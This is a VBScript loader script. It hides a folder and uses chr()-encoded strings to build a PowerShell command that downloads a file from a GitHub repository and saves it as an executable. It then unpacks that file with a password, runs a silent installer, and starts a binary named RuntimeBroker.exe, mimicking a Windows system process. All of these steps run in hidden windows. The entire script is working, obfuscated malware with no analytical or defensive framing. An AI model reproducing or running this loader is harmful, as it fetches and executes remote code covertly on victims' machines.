Dim fldr, shl, psCmd1p1, psCmd1p2, psCmd1p3, psCmd1p4, zzCmd0, zzCmd1, zzCmd2, zzCmd3, zzCmd4, zzCmd5, zzCmd6, zzCmd7, zzCmd8

On Error Resume Next
fldr = "C:\dados"
Set fso = CreateObject("Scripting.FileSystemObject")
Set shl = CreateObject("WScript.Shell")

shl.Run "cmd /c attrib +H C:\dados", 0

If fso.FileExists(fldr+"\macro_wrd.vbs") = True Then
	WScript.Quit
End If

psCmd1p1 = chr(112)+chr(111)+chr(119)+chr(101)+chr(114)+chr(115)+chr(104)+chr(101)+chr(108)+chr(108)+" -Command "+chr(34)+chr(73)+chr(110)+chr(118)+chr(111)+chr(107)+chr(101)+chr(45)+chr(87)+chr(101)+chr(98)+chr(82)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116)
psCmd1p2 = " https://github.com/satella666/2026_newOp/raw/refs/heads/main/comp.dat "
psCmd1p3 = chr(45)+chr(79)+chr(117)+chr(116)+chr(70)+chr(105)+chr(108)+chr(101)
psCmd1p4 = " "+fldr+"\comp.exe"+chr(34)

shl.Run psCmd1p1+psCmd1p2+psCmd1p3+psCmd1p4, 0
WScript.Sleep 60000 '1min

psCmd1p1 = fldr+"\comp.exe"
psCmd1p2 = " -pPMC2025 -y"
shl.Run psCmd1p1+psCmd1p2, 0
WScript.Sleep 15000 '15 sec, 1 min was too long

psCmd1p1 = fldr+"\vcredist.exe" 'VC++ redist
psCmd1p2 = " /quiet /norestart"
shl.Run psCmd1p1+psCmd1p2, 0
WScript.Sleep 15000

psCmd1p1 = fldr+"\RuntimeBroker.exe"
shl.Run psCmd1p1, 0